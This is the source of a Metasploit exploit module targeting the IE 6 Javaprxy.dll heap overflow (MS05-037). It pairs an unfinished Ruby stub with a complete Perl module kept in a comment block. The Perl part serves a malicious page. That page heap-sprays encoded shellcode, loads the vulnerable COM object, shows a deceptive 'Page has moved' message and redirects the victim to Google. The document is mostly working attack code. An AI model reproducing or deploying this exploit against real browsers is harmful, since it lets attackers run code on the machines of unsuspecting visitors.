require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IE 6.0 Javaprxy.dll Heap Overflow MS05-037',
			'Description'    => %q{
				This module exploits a vulnerability in Microsoft IE's use
				of the JView Profiler.  This works with IE 6.0 versions
				through SP2. The code is based on FrSIRT's PoC exploit.
					
			},
			'Author'         => [ 'D. Wagner (nopnine0@hush.com)' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '17680'],
					[ 'MSB', 'MS05-037'],
					[ 'CVE', '2005-2087'],
					[ 'URL', 'http://www.frsirt.com/english/advisories/2005/0935'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin
package Msf::Exploit::ie_javaprxy;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;

my $advanced =
  {
  };

my $info =
  {
	'Name'           => 'IE 6.0 Javaprxy.dll Heap Overflow MS05-037',
	'Version'        => '$Revision$',
	'Authors'        =>
	  [
		'D. Wagner (nopnine0 [at] hush.com)'
	  ],

	'Description'    =>
	  Pex::Text::Freeform(qq{
			This module exploits a vulnerability in Microsoft IE's use of 
			the JView Profiler.  This works with IE 6.0 versions through SP2.
			The code is based on FrSIRT's PoC exploit.
}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
	  },

	'Payload'        =>
	  {
		'Space'    => 1000,
		'MaxNops'  => 0,
		'Keys'     => [ '-bind' ],
	  },

	'Refs'           =>
	  [
		[ 'OSVDB', '17680' ],
		[ 'MSB', 'MS05-037' ],
		[ 'CVE', '2005-2087' ],
		[ 'URL', 'http://www.frsirt.com/english/advisories/2005/0935' ]

	  ],

	'DefaultTarget'  => 0,
	'Targets'        =>
	  [
		[ 'Windows 98, Windows ME, Windows 2000, Windows XP, Windows 2003' ]
	  ],
	
	'Keys'           => [ 'ie', 'internal' ],
  };

sub new
{
	my $class = shift;
	my $self;

	$self = $class->SUPER::new(
		{
			'Info'     => $info,
			'Advanced' => $advanced,
		},
		@_);

	return $self;
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('HTTPHOST'),
		LocalPort => $self->GetVar('HTTPPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp');
	my $client;

	# Did the listener create fail?
	if (not defined($server))
	{
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	$self->PrintLine("[*] Waiting for connections to http://" . $self->GetVar('HTTPHOST') . ":" . $self->GetVar('HTTPPORT') . " ...");

	while (defined($client = $server->accept()))
	{
		$self->HandleHttpClient(fd => Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my ($fd) = @{{@_}}{qw/fd/};
	my $shellcode = $self->GetVar('EncodedPayload')->RawPayload;
	my $content;
	my $rhost;
	my $rport;

	# Read the HTTP command
	my ($cmd, $url, $proto) = split / /, $fd->RecvLine(10);

	# Set the remote host information
	($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	# convert the shellcode to javascript utf-16 format
	my $shellcodeutf16 = unpack("H*", $shellcode);
	if ((length $shellcodeutf16) % 4) {
		$shellcodeutf16 .= '90';
	}
	$shellcodeutf16 =~ s/(..)(..)/\%u$2$1/g;

	# Build the HTML

	$content = '
<html>
<body>
<SCRIPT language="javascript">'.
"\nshellcode = unescape(\"$shellcodeutf16\");\n".
'bigblock = unescape("%u0303%u0303");
headersize = 20;
slackspace = headersize+shellcode.length
while (bigblock.length<slackspace) bigblock+=bigblock;
fillblock = bigblock.substring(0, slackspace);
block = bigblock.substring(0, bigblock.length-slackspace);
while(block.length+slackspace<0x40000) block = block+block+fillblock;
memory = new Array();
for (i=0;i<300;i++) memory[i] = block + shellcode;
document.write("Page has moved. Please wait while you are redirected...");
</SCRIPT>
<object classid="CLSID:03D9F3F2-B0E3-11D2-B081-006008039BF0"></object>
</body><script>location.replace("http://www.google.com/");</script></html>';


	$self->PrintLine("[*] HTTP Client connected from $rhost:$rport, sending payload...");

	# Transmit the HTTP response
	$fd->Send(
		"HTTP/1.1 200 OK\r\n" .
		  "Content-Type: text/html\r\n" .
		  "Content-Length: " . length($content) . "\r\n" .
		  "Connection: close\r\n" .
		  "\r\n" .
		  "$content"
	  );

	$fd->Close();
}

1;

=end


end
end	
